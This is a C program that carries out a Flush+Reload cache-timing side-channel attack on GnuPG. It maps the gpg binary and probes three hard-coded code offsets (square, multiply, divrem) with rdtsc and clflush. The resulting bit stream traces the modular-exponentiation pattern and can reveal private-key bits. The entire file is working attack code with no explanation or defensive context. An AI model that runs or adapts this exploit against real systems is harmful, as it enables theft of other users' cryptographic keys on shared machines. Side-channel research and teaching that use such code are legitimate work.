#include <sys/mman.h>
#include "stdio.h"
#include "stdlib.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
unsigned int THRESHOLD = 265;

int probe(char* addr){
    volatile unsigned int time;
    // read timestamp
    // move timestamp to another reg
    //cpuid
    // mem access
    //cpuid
    // read timestamp
    //cflush

    asm __volatile__(
        "mfence\n\t"
        "rdtsc\n\t"
        "lfence\n\t"
        "movl %%eax, %%edi\n\t"
        "movl (%1), %%eax \n\t"
        "lfence\n\t"
        "rdtsc\n\t"
        "subl %%edi, %%eax\n\t"
        "clflush 0(%1)\n\t"
        :"=a"(time)
        :"c"(addr)
        :"edi","edx"
       
    );
    //if(time<150){
    	//printf("hit\n");
    //	printf("time: %u\n",time);
    //}
   // printf("time: %u\n",time);

    

    return time < THRESHOLD;
}
void busy_wait(){
    for(int i =0; i<3900; i++){
         asm __volatile__(
        "nop\n\t"
        );
    }
   
}
int main(void){
    int fp = open("/usr/local/bin/gpg", O_RDONLY);
    struct stat statbuf;
    if (fstat (fp,&statbuf) < 0){
        printf ("fstat error");
        return 0;
   }
   char*  file_addr = (char*) mmap(0, statbuf.st_size, PROT_READ, MAP_SHARED, fp, 0);
   if(file_addr < 0){
       printf("error");
    }
   int sqr_addr= 0x9f44c;
   int mul_addr = 0x9fd80;
   int divrem_addr = 0x9e57c;
   
   for(int i=0;i< 5000;i++){
       int sqr = probe(file_addr + sqr_addr);
       int mul = probe(file_addr + mul_addr);
       int divrem = probe(file_addr + divrem_addr);
       
       if(sqr && mul && divrem){
           printf("1");
       }else{
           printf("0");
       }
       // busy wait
       busy_wait();
   
       
   }
    return 0;
}

